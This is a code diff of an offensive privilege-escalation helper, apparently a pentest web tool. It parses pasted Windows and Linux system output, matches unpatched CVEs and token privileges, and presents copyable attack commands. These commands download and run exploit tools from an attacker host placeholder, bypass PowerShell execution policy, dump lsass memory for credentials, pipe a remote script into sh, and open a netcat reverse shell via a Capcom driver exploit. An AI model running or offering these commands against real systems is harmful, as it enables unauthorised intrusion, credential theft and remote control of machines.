+        <code style="display:block;margin-top:4px;color:var(--cyan);word-break:break-all;cursor:pointer" title="Click to copy" onclick="navigator.clipboard.writeText(this.textContent).then(()=>{this.style.color='var(--green)';setTimeout(()=>this.style.color='',1000)})">iwr http://{{KALI_IP}}:{{PORT}}/windows/EnableAllTokenPrivs.ps1 -o C:\\Temp\\ep.ps1; powershell -ep bypass C:\\Temp\\ep.ps1</code>
+        <a href="https://github.com/fashionproof/EnableAllTokenPrivs" target="_blank" style="color:var(--cyan);font-size:10px">EnableAllTokenPrivs.ps1 repo &#8599;</a>
+      </div>` : '';
+
     html2 += `<div class="si-card ${cls}">
       <div class="si-vtop">
-        <span class="si-vname">&#9889; ${p.name}</span>
+        <span class="si-vname">&#9889; ${escHtml(p.name)}</span>
         <span class="si-stag s${ex.sev}">${sevLabel}</span>
-        <span class="si-vstatus">${p.enabled?'&#9888; ENABLED':'&#9744; DISABLED (still usable)'}</span>
+        <span class="si-vstatus">${p.enabled ? '&#9888; ENABLED' : '&#9744; DISABLED (still usable — see below)'}</span>
       </div>
       <div class="si-vdesc">${ex.summary}</div>
-      ${ex.warning?`<div class="si-vcond" style="color:var(--orange)">&#9888; ${escHtml(ex.warning)}</div>`:''}
+      ${ex.warning ? `<div class="si-vcond" style="color:var(--orange)">&#9888; ${escHtml(ex.warning)}</div>` : ''}
+      ${disabledNote}
       <div style="margin-top:8px">
-        ${ex.tools.map(t=>`
+        ${ex.tools.map(t => `
         <div style="margin:5px 0;background:var(--bg4);border-radius:3px;padding:6px 10px">
           <div style="font-size:10px;color:var(--cyan);font-weight:700;text-transform:uppercase;letter-spacing:.4px;margin-bottom:3px">
-            ${escHtml(t.name)}${t.note?` <span style="color:var(--text3);font-weight:400;font-size:9px">— ${escHtml(t.note)}</span>`:''}
-            ${t.link?`<a href="${t.link}" target="_blank" style="margin-left:6px;font-size:10px">&#8599; repo</a>`:''}
+            ${escHtml(t.name)}${t.note ? ` <span style="color:var(--text3);font-weight:400;font-size:9px">— ${escHtml(t.note)}</span>` : ''}
+            ${t.link ? `<a href="${escHtml(t.link)}" target="_blank" style="margin-left:6px;font-size:10px">&#8599; repo</a>` : ''}
           </div>
-          <code style="font-size:11px;color:var(--text);word-break:break-all;cursor:pointer" onclick="navigator.clipboard.writeText(this.textContent)">${escHtml(t.cmd)}</code>
+          <code style="font-size:11px;color:var(--text);word-break:break-all;cursor:pointer" title="Click to copy" onclick="navigator.clipboard.writeText(this.textContent).then(()=>{this.style.color='var(--green)';setTimeout(()=>this.style.color='',1000)})">${escHtml(t.cmd)}</code>
         </div>`).join('')}
       </div>
-      ${ex.steps?`<details style="margin-top:6px"><summary style="font-size:11px;color:var(--cyan);cursor:pointer">&#9654; Full attack steps</summary>
-        <ol style="margin:8px 0 0 16px;font-size:11px;color:var(--text2);line-height:1.8">${ex.steps.map(s=>`<li><code style="font-size:10.5px;color:var(--text)">${escHtml(s)}</code></li>`).join('')}</ol>
-      </details>`:''}
+      ${ex.steps ? `<details style="margin-top:8px" ${stepsOpen}><summary style="font-size:11px;color:var(--cyan);cursor:pointer;padding:4px 0">&#9654; Full step-by-step attack chain</summary>
+        <ol style="margin:8px 0 0 16px;font-size:11px;color:var(--text2);line-height:2">${ex.steps.map(s => `<li><code style="font-size:10.5px;color:var(--text);cursor:pointer" title="Click to copy" onclick="navigator.clipboard.writeText(this.textContent).then(()=>{this.style.color='var(--green)';setTimeout(()=>this.style.color='',1000)})">${escHtml(s)}</code></li>`).join('')}</ol>
+      </details>` : ''}
       <a class="si-goto" href="#${ex.section}" onclick="closeModal('si-modal')">&#8594; Jump to full section</a>
     </div>`;
   });
 
+  // ── STEP 10: Unmatched privileges footnote ─────────────────────────────────
   if (unmatched.length > 0) {
-    html2 += `<div style="margin-top:8px;font-size:11px;color:var(--text3)">Other privileges found (no direct exploit path): ${unmatched.map(p=>`<code style="font-size:10px;background:var(--bg4);padding:1px 4px;border-radius:2px">${p.name}</code>`).join(' ')}</div>`;
+    html2 += `<div style="margin-top:10px;padding:6px 10px;background:var(--bg4);border-radius:4px;font-size:11px;color:var(--text3)">
+      <span style="color:var(--text2)">Other privileges (no known direct exploit path):</span><br>
+      ${unmatched.map(p => `<code style="font-size:10px;background:var(--bg3);padding:2px 5px;border-radius:2px;margin:2px 2px 0 0;display:inline-block;color:${p.enabled ? 'var(--text)' : 'var(--text3)'}">${escHtml(p.name)}${p.enabled ? ' &#9679;' : ''}</code>`).join('')}
+    </div>`;
   }
 
   html2 += '</div>';
@@ -7405,36 +7558,104 @@ function parseSI() {
   const raw = document.getElementById('si-input').value.trim();
   const out = document.getElementById('si-output');
   if (!raw) { out.innerHTML = '<div class="si-placeholder">Paste output above and click Analyze</div>'; return; }
-  // Detect whoami /priv or whoami /all output
+
+  // === SMART INPUT TYPE DETECTION ===
+
+  // 1. Command paste detection (user pasted a command, not output)
+  const looksLikeCommand = raw.split('\n').length <= 3 &&
+    /^(whoami|systeminfo|uname|ipconfig|ifconfig|cat\s|ls\s|dir\s|iwr\s|curl\s|wget\s|powershell|cmd\.exe|\.\\|\.\/)/im.test(raw.trim());
+  if (looksLikeCommand) {
+    let suggestion = '';
+    if (/^whoami/im.test(raw)) {
+      suggestion = 'Run <code>whoami /all</code> in your shell, then paste the full output here.';
+    } else if (/^systeminfo/im.test(raw)) {
+      suggestion = 'Run <code>systeminfo</code> on the target, then paste the full output here. For a quick parse: <code>systeminfo | findstr /i "OS\\|Build\\|Hotfix"</code>';
+    } else if (/^uname/im.test(raw)) {
+      suggestion = 'Run <code>uname -a</code> on the target and paste the result here.';
+    } else if (/^(cat\s|ls\s)/im.test(raw)) {
+      suggestion = 'Run <code>cat /etc/os-release</code> or <code>uname -a</code> on the target and paste the result here.';
+    } else {
+      suggestion = 'Paste the <strong>OUTPUT</strong> of your command here, not the command itself.';
+    }
+    out.innerHTML = `<div class="si-msg warn">&#9888; Detected a command, not output. ${suggestion}</div>`;
+    return;
+  }
+
+  // 2. Error message paste detection
+  if (/access.?denied|permission.?denied|not recognized|cannot find|is not recognized|'\.' is not|error:/i.test(raw) && raw.split('\n').length < 5) {
+    out.innerHTML = '<div class="si-msg warn">&#9888; Looks like an error message. Fix the error on the target first, then paste the successful output of <code>whoami /all</code> or <code>systeminfo</code> here.</div>';
+    return;
+  }
+
+  // 3. whoami /priv or /all detection
   const isPrivs = /PRIVILEGES INFORMATION|Se\w+Privilege\s+\S.*?(Enabled|Disabled)/i.test(raw);
   if (isPrivs) { parseTokenPrivs(raw, out); return; }
-  const isLin = /linux\s|\d+\.\d+\.\d+.*#\d+/i.test(raw) && !/windows|microsoft|os name/i.test(raw);
-  isLin ? parseSILinux(raw, out) : parseSIWindows(raw, out);
+
+  // 4. Linux detection — uname -a, uname -r, /proc/version, /etc/os-release, /etc/issue
+  const isLin = (
+    /linux\b/i.test(raw) ||
+    /\d+\.\d+\.\d+[-.\w]*(?:-generic|-kali|-el\d|-amd64|-arm64|-lowlatency)/.test(raw) ||
+    /NAME="?(ubuntu|debian|centos|fedora|rhel|kali|arch|alpine|opensuse|rocky|alma)/i.test(raw) ||
+    /ID=(ubuntu|debian|centos|fedora|rhel|kali|arch|alpine|opensuse|rocky|alma)/i.test(raw) ||
+    /Ubuntu \d+\.\d+|Debian GNU\/Linux|CentOS Linux/i.test(raw)
+  ) && !/windows|microsoft|os name:\s*windows/i.test(raw);
+  if (isLin) { parseSILinux(raw, out); return; }
+
+  // 5. Partial Windows version string — try the parser anyway, it handles short input
+  if (/10\.0\.\d{5}|windows\s+\d+|server\s+20\d{2}/i.test(raw) && raw.split('\n').length < 5) {
+    parseSIWindows(raw, out);
+    return;
+  }
+
+  // 6. Default → try Windows parser
+  parseSIWindows(raw, out);
 }
 
 function parseSIWindows(raw, out) {
   const osM = raw.match(/OS Name[:\s]+(.+)/i);
-  // robust build extraction: "OS Version: 10.0.19041" or "Build 19041" or bare build number
-  const bldM = raw.match(/OS Version[:\s]+[\d.]+\.([\d]+)/i)
-             || raw.match(/Build\s+(\d{4,5})/i)
-             || raw.match(/\b(19041|19042|19043|19044|19045|18363|18362|17763|16299|15063|14393|10586|10240|9600|9200|7601|20348|22000|22621|22631)\b/);
+
+  // FIX (critical): old regex /OS Version[:\s]+[\d.]+\.([\d]+)/i captured the LAST dotted
+  // segment of "10.0.19044.1288" which is the revision (1288), NOT the build (19044).
+  // New: match "10.0.<build>" explicitly so capture group [1] is always the 5-digit build.
+  // Fallback 1: "Build Number: 19044" or "OS Build: 19041" or "Build 19044"
+  // Fallback 2: any 5-digit Windows build number — covers future builds without hardcoded list
+  const bldM = raw.match(/OS Version[:\s]+10\.0\.([\d]{4,5})/i)
+             || raw.match(/Build(?:\s+Number)?[:\s]+(\d{4,5})/i)
+             || raw.match(/\b(1[0-9]{4}|2[0-2][0-9]{3})\b/);
+
   const archM = raw.match(/System Type[:\s]+(.+)/i);
   const build = bldM ? parseInt(bldM[1]) : null;
-  // catch both KB7-digit and KB6-digit
-  const kbs = new Set([...(raw.matchAll(/KB\d{6,7}/gi))].map(m => m[0].toUpperCase()));
+
+  // KB extraction: handles "[01]: KB5006670" indented list and "KB xxxxxxx" with optional space
+  const kbs = new Set([...(raw.matchAll(/KB\s*(\d{6,7})/gi))].map(m => ('KB' + m[1]).toUpperCase()));
   const hotfixList = [...kbs].sort();
+
+  // Detect explicit "Hotfix(s): N/A" — user confirmed zero patches; all CVEs in range are live
+  const hotfixNA = /Hotfix\(s\)[:\s]+N\/A/i.test(raw);
 
   let html = '<div class="si-os-header">';
   if (osM) html += `<div class="si-os-name">${escHtml(osM[1].trim())}</div>`;
   if (build) html += `<div class="si-build">Build ${build} &mdash; ${WIN_BUILDS_MAP[build] || 'Unknown OS version'}</div>`;
   if (archM) html += `<div class="si-arch">${escHtml(archM[1].trim())}</div>`;
-  if (hotfixList.length > 0) {
+  if (hotfixNA) {
+    html += `<div class="si-arch" style="margin-top:6px;color:var(--orange)">&#9888; Hotfix(s): N/A — no patches installed, all CVEs in range are potentially exploitable.</div>`;
+  } else if (hotfixList.length > 0) {
     html += `<div class="si-arch" style="margin-top:6px;color:var(--text2)">Hotfixes installed (${hotfixList.length}): <span style="color:var(--cyan);font-size:11px">${hotfixList.slice(0,12).join(', ')}${hotfixList.length>12?' …':''}</span></div>`;
   }
   html += '</div>';
 
   if (!build) {
-    out.innerHTML = html + '<div class="si-msg warn">&#9888; Could not extract build number. Paste the full systeminfo output. Quick extract: <code>systeminfo | findstr /i "OS Version\\|Build"</code></div>';
+    out.innerHTML = html + `<div class="si-msg warn" style="line-height:1.8">
+  &#9888; Could not extract Windows build number.<br><br>
+  <strong>Quick fix &mdash; run this on the target and paste the result:</strong><br>
+  <code style="color:var(--cyan)">systeminfo | findstr /i "OS Version"</code><br><br>
+  <strong>Or get just the build number:</strong><br>
+  <code style="color:var(--cyan)">[System.Environment]::OSVersion.Version</code><br>
+  <code style="color:var(--cyan)">(Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").CurrentBuild</code><br><br>
+  <strong>Or paste one of these known build formats:</strong><br>
+  <code style="color:var(--text2);font-size:10px">OS Version: 10.0.19044.1288 N/A Build 19044</code><br>
+  <code style="color:var(--text2);font-size:10px">Build Number: 19044</code>
+</div>`;
     return;
   }
 
@@ -7442,13 +7663,21 @@ function parseSIWindows(raw, out) {
   const sevOrder = {c:0,h:1,m:2};
   const relevant = WIN_VULNS
     .filter(v => v.type === 'cve' && v.min <= build && v.max >= build)
-    .map(v => ({...v, patched: !!(v.patchKBs && v.patchKBs.some(kb => kbs.has(kb)))}))
+    .map(v => ({
+      ...v,
+      // If hotfixes are explicitly N/A, nothing can be patched
+      patched: !hotfixNA && !!(v.patchKBs && v.patchKBs.some(kb => kbs.has(kb)))
+    }))
     .sort((a,b) => (a.patched - b.patched) || (sevOrder[a.sev]||2) - (sevOrder[b.sev]||2));
 
   let vulnN = relevant.filter(v => !v.patched).length;
   let html2 = '<div class="si-vulns">';
   relevant.forEach(v => {
     const cls = v.patched ? 'sv-patched' : 'sv-vuln';
+    // Build a one-liner download command for each unpatched CVE with a GitHub link
+    const dlCmd = (!v.patched && v.link)
+      ? `iwr -Uri "${v.link}" -OutFile "$env:TEMP\\exploit_${v.cve || v.name.replace(/\s+/g,'_')}.exe"`
+      : null;
     html2 += `<div class="si-card ${cls}">
       <div class="si-vtop">
         <span class="si-vname">${v.name}</span>
@@ -7459,6 +7688,7 @@ function parseSIWindows(raw, out) {
       <div class="si-vdesc">${v.desc}</div>
       <div class="si-vcond" style="font-size:11px;color:var(--text3);margin-bottom:3px">Conditions: ${v.cond}</div>
       ${v.tool ? `<div style="font-size:11px;color:var(--text2)">Tool: <code style="color:var(--cyan)">${v.tool}</code>${v.link?` &nbsp;<a href="${v.link}" target="_blank" style="font-size:11px">&#8599;</a>`:''}</div>` : ''}
+      ${dlCmd ? `<div style="font-size:11px;margin-top:4px;color:var(--text2)">Download: <code style="color:var(--green);font-size:10px;word-break:break-all">${escHtml(dlCmd)}</code></div>` : ''}
       ${v.patchKBs ? `<div class="si-kbs">Patch KBs: ${v.patchKBs.map(k=>`<span class="si-kb ${kbs.has(k)?'present':'missing'}">${k}</span>`).join('')}</div>` : ''}
       ${!v.patched ? `<a class="si-goto" href="#${v.section}" onclick="closeModal('si-modal')">&#8594; Jump to exploit section</a>` : ''}
     </div>`;
@@ -7466,8 +7696,8 @@ function parseSIWindows(raw, out) {
   if (relevant.length === 0) html2 += '<div style="color:var(--text3);padding:8px">No CVE matches for build ' + build + ' in this database.</div>';
   html2 += '</div>';
 
-  if (!vulnN && kbs.size === 0) {
-    html2 += '<div class="si-msg warn">&#9888; No hotfixes in output — list may be empty. Also run: <code>wmic qfe list brief</code></div>';
+  if (!vulnN && kbs.size === 0 && !hotfixNA) {
+    html2 += '<div class="si-msg warn">&#9888; No hotfixes detected in output — list may be truncated. Also run: <code>wmic qfe list brief</code></div>';
   } else if (!vulnN && relevant.length > 0) {
     html2 += '<div class="si-msg ok">&#10003; All checked CVEs appear patched for this build. Pivot to token privileges, service misconfigs, credential hunting.</div>';
   } else if (vulnN > 0) {
@@ -7477,34 +7707,217 @@ function parseSIWindows(raw, out) {
 }
 
 function parseSILinux(raw, out) {
-  const km = raw.match(/(\d+)\.(\d+)\.(\d+)/);
-  const k = km ? [+km[1],+km[2],+km[3]] : null;
+  // ── 1. Extract kernel version from multiple input formats ──────────────────
+  // Priority order: uname -a / uname -r / /proc/version / /etc/os-release
+  let k = null;
+  let kFull = '';  // full version string like "5.15.0-48-generic"
+
+  // /proc/version: "Linux version 5.4.0-149-generic ..."
+  const procM = raw.match(/Linux\s+version\s+([\d]+)\.([\d]+)\.([\d]+)([-.\w]*)/i);
+  if (procM) {
+    k = [+procM[1], +procM[2], +procM[3]];
+    kFull = procM[1]+'.'+procM[2]+'.'+procM[3]+procM[4];
+  }
+  // uname -a: "Linux hostname 5.15.0-48-generic #54-Ubuntu ..." — field 3
+  if (!k) {
+    const unaM = raw.match(/^Linux\s+\S+\s+([\d]+)\.([\d]+)\.([\d]+)([-.\w]*)/m);
+    if (unaM) {
+      k = [+unaM[1], +unaM[2], +unaM[3]];
+      kFull = unaM[1]+'.'+unaM[2]+'.'+unaM[3]+unaM[4];
+    }
+  }
+  // uname -r standalone: just "5.15.0-48-generic"
+  if (!k) {
+    const urM = raw.match(/^([\d]+)\.([\d]+)\.([\d]+)([-.\w]*)\s*$/m);
+    if (urM) {
+      k = [+urM[1], +urM[2], +urM[3]];
+      kFull = urM[1]+'.'+urM[2]+'.'+urM[3]+urM[4];
+    }
+  }
+  // Fallback: first x.y.z occurrence in raw
+  if (!k) {
+    const km = raw.match(/([\d]+)\.([\d]+)\.([\d]+)/);
+    if (km) {
+      k = [+km[1], +km[2], +km[3]];
+      kFull = km[1]+'.'+km[2]+'.'+km[3];
+    }
+  }
+
   const kstr = k ? k.join('.') : 'unknown';
-  const distroM = raw.match(/(ubuntu|debian|centos|fedora|rhel|kali|arch|alpine|opensuse)/i);
 
-  let html = `<div class="si-os-header"><div class="si-os-name">Linux ${distroM?distroM[1]:''}</div><div class="si-build">Kernel ${kstr}</div></div>`;
-  if (!k) { out.innerHTML = html + '<div class="si-msg warn">&#9888; Could not extract kernel version.</div>'; return; }
+  // ── 2. Detect distro ───────────────────────────────────────────────────────
+  // From uname -a comment field, /etc/os-release NAME=, /etc/issue, or build tag
+  const distroM = raw.match(/NAME="?([^"\n]+)"?/i)
+               || raw.match(/(ubuntu|debian|centos|rhel|fedora|kali|arch|alpine|opensuse|rocky|alma)/i);
+  let distro = distroM ? distroM[1].trim() : '';
 
-  const kv = x => x[0]*1e6+x[1]*1e3+x[2];
+  // Build flavor from uname -a (e.g. "generic", "kali9", "el7")
+  let flavor = '';
+  const flavorM = kFull.match(/-(\w+)$/);
+  if (flavorM) flavor = flavorM[1];
+
+  // Detect Ubuntu from flavor or explicit string
+  const isUbuntu = /ubuntu/i.test(raw) || /generic|lowlatency/.test(flavor);
+  const isCentOS  = /centos|el\d/i.test(raw) || /el\d/.test(kFull);
+  const isDebian  = /debian/i.test(raw) || /kali/.test(raw);
+
+  // Distro label for header
+  if (!distro) {
+    if (isUbuntu) distro = 'Ubuntu';
+    else if (isCentOS) distro = 'CentOS/RHEL';
+    else if (isDebian) distro = 'Debian';
+  }
+
+  // Architecture
+  const archM = raw.match(/\b(x86_64|aarch64|armv7l|i686|i386)\b/);
+  const arch = archM ? archM[1] : '';
+
+  // VERSION_ID from /etc/os-release
+  const verIdM = raw.match(/VERSION_ID="?([\d.]+)"?/i);
+  const osVer = verIdM ? verIdM[1] : '';
+
+  // ── 3. Build header ────────────────────────────────────────────────────────
+  let html = '<div class="si-os-header">';
+  html += `<div class="si-os-name">Linux ${escHtml(distro)}</div>`;
+  if (kFull) {
+    html += `<div class="si-build">Kernel ${escHtml(kFull)}</div>`;
+  } else {
+    html += `<div class="si-build">Kernel ${escHtml(kstr)}</div>`;
+  }
+  if (arch) html += `<div class="si-arch">${escHtml(arch)}</div>`;
+  if (osVer) html += `<div class="si-arch" style="color:var(--text2)">OS version: ${escHtml(osVer)}</div>`;
+  html += '</div>';
+
+  // ── 4. Handle /etc/os-release only input (no kernel version) ──────────────
+  if (!k) {
+    const hasOsRelease = /NAME=|VERSION_ID=|ID=/i.test(raw);
+    if (hasOsRelease) {
+      out.innerHTML = html + `<div class="si-msg warn">
+        &#9888; OS info detected but no kernel version found.<br><br>
+        <strong>Also run these on the target and paste the combined output:</strong><br>
+        <code style="color:var(--cyan)">uname -a</code><br>
+        <code style="color:var(--cyan)">cat /etc/os-release</code><br>
+        <code style="color:var(--cyan)">cat /proc/version</code>
+      </div>`;
+    } else {
+      out.innerHTML = html + `<div class="si-msg warn">
+        &#9888; Could not extract kernel version from input.<br><br>
+        <strong>Run one of these and paste the result:</strong><br>
+        <code style="color:var(--cyan)">uname -a</code>
+        &nbsp;&nbsp;<em style="color:var(--text3)">— most complete</em><br>
+        <code style="color:var(--cyan)">uname -r</code>
+        &nbsp;&nbsp;<em style="color:var(--text3)">— kernel version only</em><br>
+        <code style="color:var(--cyan)">cat /proc/version</code>
+      </div>`;
+    }
+    return;
+  }
+
+  // ── 5. DirtyPipe accurate LTS branch check ─────────────────────────────────
+  // CVE-2022-0847: fixed in 5.16.11, 5.15.25, 5.10.102
+  // The LIN_VULNS entry uses maxK [5,16,10] as ceiling, so 5.16.11+ falls outside.
+  // But 5.15.x ≥ 5.15.25 and 5.10.x ≥ 5.10.102 are also fixed — mark separately.
+  function isDirtyPipeVulnerable(kArr) {
+    const [maj, min, pat] = kArr;
+    if (maj !== 5) return false;
+    if (min < 8) return false;   // < 5.8.0 not affected
+    if (min >= 17) return false; // 5.17+ fine
+    if (min === 16 && pat >= 11) return false; // >= 5.16.11 fixed
+    if (min === 15 && pat >= 25) return false; // >= 5.15.25 fixed (LTS branch)
+    if (min === 10 && pat >= 102) return false; // >= 5.10.102 fixed (LTS branch)
+    if (min === 10 && pat < 102) return true;
+    if (min === 15 && pat < 25)  return true;
+    return true; // 5.8 – 5.14.x all vulnerable, 5.16.0–5.16.10 vulnerable
+  }
+
+  // ── 6. Compute kernel value helper ─────────────────────────────────────────
+  const kv = x => x[0]*1e6 + x[1]*1e3 + x[2];
   const kval = kv(k);
+
+  // ── 7. Render CVE cards ────────────────────────────────────────────────────
   html += '<div class="si-vulns">';
+
+  let vulnCount = 0;
   LIN_VULNS.forEach(v => {
-    const inRange = kval >= kv(v.minK) && kval <= kv(v.maxK);
     const isUniversal = v.minK[0]===0 && v.maxK[0]===99;
+    let inRange;
+    if (v.cve === 'CVE-2022-0847') {
+      inRange = isDirtyPipeVulnerable(k);
+    } else {
+      inRange = kval >= kv(v.minK) && kval <= kv(v.maxK);
+    }
     const cls = isUniversal ? 'sv-check' : inRange ? 'sv-vuln' : 'sv-patched';
+    if (cls === 'sv-vuln') vulnCount++;
+
+    // Status label
+    let statusLabel;
+    if (cls === 'sv-vuln')    statusLabel = '&#9888; LIKELY VULNERABLE';
+    else if (cls === 'sv-check') statusLabel = '&#9889; CHECK MANUALLY';
+    else                         statusLabel = '&#10003; OUT OF RANGE';
+
+    // Severity label
+    const sevLabel = v.sev==='c' ? 'CRITICAL' : v.sev==='h' ? 'HIGH' : 'MEDIUM';
+
     html += `<div class="si-card ${cls}">
       <div class="si-vtop">
-        <span class="si-vname">${v.name}</span>
-        <span class="si-cve">${v.cve}</span>
-        <span class="si-stag s${v.sev}">${v.sev==='c'?'CRITICAL':'HIGH'}</span>
-        <span class="si-vstatus">${cls==='sv-vuln'?'&#9888; LIKELY VULNERABLE':cls==='sv-check'?'&#9889; CHECK MANUALLY':'&#10003; OUT OF RANGE'}</span>
+        <span class="si-vname">${escHtml(v.name)}</span>
+        <span class="si-cve">${escHtml(v.cve)}</span>
+        <span class="si-stag s${v.sev}">${sevLabel}</span>
+        <span class="si-vstatus">${statusLabel}</span>
       </div>
       <div class="si-vdesc">${v.desc}</div>
-      <div class="si-vcond">${v.check}</div>
-      <a class="si-goto" href="#${v.section}" onclick="closeModal('si-modal')">&#8594; Go to section</a>
+      <div class="si-vcond" style="font-size:11px;color:var(--text3);margin-bottom:3px">${v.check}</div>`;
+
+    // Download command
+    if ((cls === 'sv-vuln' || cls === 'sv-check') && v.dl) {
+      html += `<div style="margin-top:4px;font-size:11px">
+        <span style="color:var(--text2)">Download/Run:</span>
+        <code style="font-size:10.5px;color:var(--cyan);word-break:break-all;cursor:pointer"
+              onclick="navigator.clipboard.writeText(this.textContent)"
+              title="Click to copy">${escHtml(v.dl)}</code>
+      </div>`;
+    }
+
+    // Link
+    if (v.link) {
+      html += `<div style="font-size:11px;color:var(--text2);margin-top:3px">
+        Repo: <a href="${escHtml(v.link)}" target="_blank" style="font-size:11px;color:var(--cyan)">${escHtml(v.link)} &#8599;</a>
+      </div>`;
+    }
+
+    html += `<a class="si-goto" href="#${escHtml(v.section)}" onclick="closeModal('si-modal')">&#8594; Go to section</a>
     </div>`;
   });
+
   html += '</div>';
+
+  // ── 8. Quick-commands footer ───────────────────────────────────────────────
+  html += `<div class="si-msg" style="margin-top:10px;line-height:1.9;border-color:var(--cyan)">
+    <strong style="color:var(--cyan)">Quick commands — also run these on the target:</strong><br>
+    <code style="color:var(--cyan)">sudo -l</code>
+    &nbsp;<span style="color:var(--text3)">— check sudo rights</span><br>
+    <code style="color:var(--cyan)">find / -perm -4000 -type f 2>/dev/null</code>
+    &nbsp;<span style="color:var(--text3)">— SUID binaries</span><br>
+    <code style="color:var(--cyan)">find / -perm -2000 -type f 2>/dev/null</code>
+    &nbsp;<span style="color:var(--text3)">— SGID binaries</span><br>
+    <code style="color:var(--cyan)">cat /etc/crontab; ls -la /etc/cron*</code>
+    &nbsp;<span style="color:var(--text3)">— scheduled tasks</span><br>
+    <code style="color:var(--cyan)">find / -writable -type f -not -path "*/proc/*" 2>/dev/null | grep -v "^/sys"</code>
+    &nbsp;<span style="color:var(--text3)">— writable files</span><br>
+    <code style="color:var(--cyan)">curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code>
+    &nbsp;<span style="color:var(--text3)">— LinPEAS (full auto-enum)</span><br>
+    <code style="color:var(--cyan)">dpkg -l policykit-1 2>/dev/null; rpm -qi polkit 2>/dev/null</code>
+    &nbsp;<span style="color:var(--text3)">— polkit version (PwnKit)</span><br>
+    <code style="color:var(--cyan)">sudo --version 2>/dev/null | head -1</code>
+    &nbsp;<span style="color:var(--text3)">— sudo version (Baron Samedit)</span>
+  </div>`;
+
+  if (vulnCount > 0) {
+    html += `<div class="si-msg warn">&#9888; ${vulnCount} CVE(s) appear LIKELY VULNERABLE for kernel ${escHtml(kstr)}. Verify manually before exploitation.</div>`;
+  } else {
+    html += `<div class="si-msg ok">&#10003; No kernel CVEs matched for ${escHtml(kstr)} — pivot to SUID/sudo/cron/service misconfigs. Run LinPEAS for full coverage.</div>`;
+  }
+
   out.innerHTML = html;
 }
 
@@ -7648,8 +8061,8 @@ const DT = {
             'powershell -c "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {{WPATH}}\\lsass.dmp full"',
             '# Transfer lsass.dmp to Kali → pypykatz lsa minidump lsass.dmp']},
     loaddriver: {q:'SeLoadDriverPrivilege → load Capcom.sys → SYSTEM via ExploitCapcom',final:true,s:'win-exploits',
-      cmds:['{{WPATH}}\\eoploaddriver.exe System\\CurrentControlSet\\dfserv {{WPATH}}\\Capcom.sys',
-            '{{WPATH}}\\ExploitCapcom.exe LOAD {{WPATH}}\\Capcom.sys','{{WPATH}}\\ExploitCapcom.exe',
+      cmds:['{{WPATH}}\\eoploaddriver_x64.exe System\\CurrentControlSet\\dfserv {{WPATH}}\\Capcom.sys',
+            '{{WPATH}}\\ExploitCapcom.exe EXPLOIT "{{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"',
             '# RESTORE: reg delete HKLM\\System\\CurrentControlSet\\dfserv /f']},
     managevol: {q:'SeManageVolumePrivilege → write tzres.dll to wbem → trigger via systeminfo',final:true,s:'win-exploits',
       cmds:['{{WPATH}}\\SeManageVolumeExploit.exe',
